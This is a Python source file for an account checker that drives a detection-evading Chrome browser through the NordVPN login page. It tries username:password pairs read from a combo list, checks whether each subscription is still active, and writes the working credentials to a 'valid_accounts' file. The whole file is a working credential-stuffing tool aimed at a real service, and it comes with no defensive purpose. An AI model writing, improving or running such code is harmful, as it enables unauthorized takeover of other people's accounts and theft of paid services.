import time
import undetected_chromedriver as stealthdriver
from pathlib import Path
from undetected_chromedriver import options
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import WebDriverException
from selenium.webdriver.common.by import By


class Checker:
    def __init__(self, window_size):
        self.browser = None
        self.path = str(Path(__file__).parent)
        self.save_directory = self.path + "/valid_accounts/valid"
        self.save_file = None
        self.driver_path = self.path + "/chromedriver_102.0.5005.61/chromedriver"
        self.window_size = window_size
        self.page = "https://my.nordaccount.com/oauth2/login"
        self.account_page = "https://my.nordaccount.com/dashboard/nordvpn/"
        self.users = []
        self.passwords = []

    def save_account(self, user, password):
        with open(self.path + "/valid_accounts/valid", 'w') as valid_acc:
            valid_acc.write(user + ":" + password + "\n")
        valid_acc.close()

    def get_credentials(self):
        with open(self.path + "/nord.txt") as combos:
            for i in combos.readlines():
                self.users.append(i.split(":")[0])
                self.passwords.append(i.split(":")[1].split(" ")[0].replace("\n", ""))
        combos.close()
        return len(self.users)

    def start(self, counter):
        self.browser = stealthdriver.Chrome(browser_executable_path="/usr/bin/google-chrome-stable",
                                            driver_executable_path=self.driver_path)
        self.browser.set_window_size(self.window_size[0], self.window_size[1])
        self.browser.get(self.page)
        print("Trying combo: {}:{}".format(self.users[counter], self.passwords[0]), end="")
        time.sleep(1)
        email = self.browser.find_element(By.XPATH, "//input[@aria-label='Username or email address']")
        email_button = self.browser.find_element(By.XPATH, "//button[@type='submit']")
        email.send_keys(self.users[counter])
        time.sleep(0.5)
        email_button.click()
        time.sleep(0.8)
        password = self.browser.find_element(By.XPATH, "//input[@aria-label='Password']")
        password_button = self.browser.find_element(By.XPATH, "//button[@type='submit']")
        password.send_keys(self.passwords[counter])
        time.sleep(0.8)
        password_button.click()
        time.sleep(3)

        if "https://my.nordaccount.com/dashboard/" in self.browser.current_url:
            self.browser.get(self.account_page)
            time.sleep(4)
            if self.browser.find_elements(By.XPATH, '//div[@class="text-small inline-block text-grey-darkest"]'):
                account_status_text = (self.browser.find_element
                                       (By.XPATH,'//div[@class="text-small inline-block text-grey-darkest"]').text)
                if "Expires" in account_status_text:
                    print(" ---> Success!".format(self.users[counter], self.passwords[counter]))
                    self.save_account(self.users[counter], self.passwords[counter])
                if "Expired" in account_status_text:
                    print(" ---> Expired".format(self.users[counter], self.passwords[counter]))
        else:
            print(" ---> Invalid Account".format(self.users[counter], self.passwords[counter]))

        self.browser.close()
